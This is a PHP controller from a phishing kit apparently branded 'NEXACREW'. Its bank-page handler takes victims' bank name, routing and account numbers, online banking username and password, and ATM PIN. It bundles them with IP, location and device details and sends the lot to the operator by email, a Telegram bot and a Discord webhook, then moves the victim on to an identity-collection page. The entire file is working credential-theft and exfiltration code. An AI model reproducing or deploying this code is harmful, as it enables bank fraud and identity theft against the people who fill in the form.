<?php
defined("ALLOW") or exit('No direct script access allowed');

class Bank
{
	public $goNEXA;
	public function __construct()
	{
		$this->goNEXA = new goNEXA();
		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 7)) {
			write(FCPATH . 'Static/log_click.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|RELOAD\r\n");
			redirect(base_url() . '?' . _config('PARAMETER'));
		}
	}

	public function index()
	{
		if ($this->goNEXA->is_mobile) {
			echo view('mobile/bank');
		} else {
			echo view('pc/bank');
		}
	}

	public function process()
	{
		if (isset($_POST)) {
			$bank_holder = trim($_SESSION['namecard']);
			$name        = $_POST['bankname'];
			$routingnum   = $_POST['routingnum'];
			$accountnum   = $_POST['accountnum'];
			$usernameb   = $_POST['username'];
			$passwordb   = $_POST['password'];
			$pin 		 = $_POST['atmpin'];

			$message =
				"== [NEXACREW] ==

== [LOG BANK] ==

:: Name on Account     : {$bank_holder}
:: Bank Name           : {$name}
:: Routing Number      : {$routingnum}
:: Account Number      : {$accountnum}
:: Username            : {$usernameb}
:: Password            : {$passwordb}
:: ATM Pin             : {$pin}

== [DEVICE INFORMATION] ==

:: Date & Time         : " . _date() . "
:: Device              : {$this->goNEXA->platform}
:: Browser             : {$this->goNEXA->browser}
:: Country             : {$_SESSION['country']}
:: State               : {$_SESSION['region']}
:: City                : {$_SESSION['city']}
:: IP Address          : {$this->goNEXA->ip_address}
:: User Agent          : {$this->goNEXA->agent}";

			$subject = "LOG BANK :: [ {$this->goNEXA->ip_address} - {$_SESSION['country']} ]";
			$headers = "From: NEXACREW <idontneed@nexacrew.net>\r\n";

			// Kirim ke Email
			@mail(_config('RESULT'), $subject, $message, $headers);

			// Kirim ke Telegram jika aktif
			if (_config('Telegram') == 'on') {
				$c = curl_init();
				curl_setopt($c, CURLOPT_URL, 'https://api.telegram.org/bot' . tel('token') . '/sendMessage?chat_id=' . tel('idtelegram') . '&text=' . urlencode($message));
				curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
				curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
				curl_exec($c);
				curl_close($c);
			}

			// Kirim ke Discord jika aktif
			if (discord('DISCORD') == 'on') {
				$discordWebhook = discord('DISCORD_WEBHOOK'); // Contoh: https://discord.com/api/webhooks/xxx/yyy
				$json_data = json_encode([
					"content" => $message
				]);

				$ch = curl_init($discordWebhook);
				curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
				curl_setopt($ch, CURLOPT_POST, 1);
				curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
				curl_exec($ch);
				curl_close($ch);
			}
			write(FCPATH . 'Static/log_bank.txt', 'a', "{$this->goNEXA->ip_address}\r\n");
			write(FCPATH . 'Static/log_human.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|GET BANK\r\n");
			// Redirect sesuai konfigurasi
			if (_config('GETPAP') == 'on') {
				$_SESSION['access'] = 8;
				redirect(base_url() . 'Identity/#_dn=' . md5(rand(0, 999)));
			} else {
				$_SESSION['access'] = 9;
				redirect(base_url() . 'finished/#_dn=' . md5(rand(0, 999)));
			}
		}
	}
}
